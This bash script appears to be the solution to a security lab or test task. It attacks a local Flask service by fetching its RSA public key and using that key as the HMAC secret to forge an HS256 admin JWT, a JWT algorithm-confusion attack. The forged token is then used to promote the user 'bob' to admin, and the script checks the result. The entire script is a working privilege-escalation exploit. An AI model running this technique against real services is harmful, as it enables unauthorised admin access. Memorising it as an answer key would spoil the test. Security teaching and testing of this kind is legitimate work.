#!/usr/bin/env bash
set -euo pipefail

# Wait for Flask to be ready (up to 30 seconds)
echo "Waiting for Flask..."
for i in $(seq 1 30); do
    if curl -sf http://localhost:5000/users > /dev/null 2>&1; then
        echo "Flask is up."
        break
    fi
    sleep 1
done

# Step 1: Retrieve the RSA public key
curl -sf http://localhost:5000/public-key -o /tmp/pub_key.pem
echo "Retrieved public key."

# Step 2: Forge an admin JWT signed with HS256 using the public key as the HMAC secret
# This exploits the algorithm confusion vulnerability in auth.py:
#   _verify_hmac_compat() uses the RSA public key PEM as the HMAC-SHA256 secret.
python3 - <<'PYEOF'
import jwt
import time

with open("/tmp/pub_key.pem") as f:
    pub_key_pem = f.read()

now = int(time.time())
forged_payload = {
    "sub": "attacker",
    "role": "admin",
    "iat": now,
    "iss": "auth-service-v2",
}

# Sign with HS256 using the RSA public key PEM as the HMAC secret
forged_token = jwt.encode(forged_payload, pub_key_pem, algorithm="HS256")

with open("/tmp/forged_token.txt", "w") as f:
    f.write(forged_token)

print("Forged admin token written to /tmp/forged_token.txt")
PYEOF

FORGED_TOKEN=$(cat /tmp/forged_token.txt)

# Step 3: Call /promote to elevate bob to admin
RESPONSE=$(curl -sf -X POST http://localhost:5000/promote \
    -H "Authorization: Bearer ${FORGED_TOKEN}" \
    -H "Content-Type: application/json" \
    -d '{"username": "bob"}')

echo "Promote response: ${RESPONSE}"

# Step 4: Verify the change
USERS=$(curl -sf http://localhost:5000/users)
echo "Current users: ${USERS}"

python3 - <<PYEOF
import json, sys
users = json.loads("""${USERS}""")
bob_role = users.get("bob", {}).get("role")
if bob_role == "admin":
    print("SUCCESS: bob is now admin")
else:
    print(f"FAILURE: bob role is '{bob_role}'")
    sys.exit(1)
PYEOF
